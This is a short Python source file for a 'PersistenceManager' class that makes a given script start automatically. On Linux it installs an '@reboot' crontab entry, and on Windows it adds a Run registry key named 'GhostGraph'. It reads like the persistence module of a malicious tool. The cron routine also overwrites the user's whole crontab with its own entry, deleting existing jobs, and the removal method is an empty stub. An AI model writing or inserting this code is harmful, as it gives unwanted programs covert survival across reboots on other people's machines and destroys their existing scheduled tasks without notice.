import os
import platform
import subprocess

class PersistenceManager:
    def __init__(self, config: dict):
        self.methods = config.get('methods', [])
        self.script_path = config.get('script_path', __file__)
        
    def install(self):
        system = platform.system().lower()
        for method in self.methods:
            if system == 'linux' and method == 'cron':
                self._add_cron()
            elif system == 'windows' and method == 'registry':
                self._add_registry()
    
    def _add_cron(self):
        cron_entry = f"@reboot python3 {self.script_path}\n"
        subprocess.run(['crontab', '-l'], capture_output=True)
        with open(os.environ['HOME'] + '/.cron_temp', 'w') as f:
            f.write(cron_entry)
        os.system('crontab ~/.cron_temp && rm ~/.cron_temp')
    
    def _add_registry(self):
        # Windows: Use reg add
        cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v GhostGraph /t REG_SZ /d "{self.script_path}" /f'
        os.system(cmd)
    
    def remove(self):
        # Reverse operations
        pass  # Implement cleanup
